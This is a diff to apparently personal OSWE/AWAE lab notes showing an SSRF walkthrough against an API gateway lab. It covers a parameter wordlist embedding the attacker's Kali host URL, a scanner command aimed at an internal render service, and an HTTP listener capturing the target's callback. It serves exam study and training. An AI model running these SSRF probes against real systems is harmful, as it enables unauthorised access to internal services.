@@ -481,7 +481,7 @@ Output:
 ```
 We received one interesting response: `"Request failed with status code 400"`. An HTTP `400 Bad Request` usually indicates that the server cannot process a request due to missing data or a client error.
 
-If the service generates content, we need to determine how to supply data to it. We'll start by testing a small set of relevant parameter names and values, **including our Kali host in URLs to monitor for callbacks**.
+If the service generates content, we need to determine how to supply data to it. We'll start by testing a small set of relevant parameter names and values, **including our Kali host in URLs to monitor for callbacks**. `paths2.txt`:
 
 ```text
 ?data=foobar
@@ -490,10 +490,17 @@ If the service generates content, we need to determine how to supply data to it.
 ?input=foobar
 ?target=http://192.168.45.203/render/target
 ```
-Even without valid parameters, triggering errors on the render service might reveal useful clues. In unfamiliar environments, subtle differences in server responses can help us understand the system. We'll run a new wordlist through our [ssrf_path_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_path_scanner.py) script again, updating the SSRF target to the new URL.
+Even without valid parameters, triggering errors on the render service might reveal useful clues. In unfamiliar environments, subtle differences in server responses can help us understand the system. We'll run a new wordlist through our [ssrf_path_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_path_scanner.py) script again, updating the SSRF target to the new URL. With an HTTP server opened on port `80`:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+```
 
 Output:
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ python3 ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000/api/render -p paths2.txt --timeout 5      
 ?data=foobar    EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
@@ -504,4 +511,13 @@ Output:
                                                                                                                                                                                              
 ┌──(kali㉿kali)-[~]
 └─$ 
+```
+It seems the url parameter was a valid request based on the permission error message. Let's check if it actually connected back to our Kali host.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.217.135 - - [29/Jul/2025 11:42:09] code 404, message File not found
+192.168.217.135 - - [29/Jul/2025 11:42:09] "GET /render/url HTTP/1.1" 404 -
+
 ```
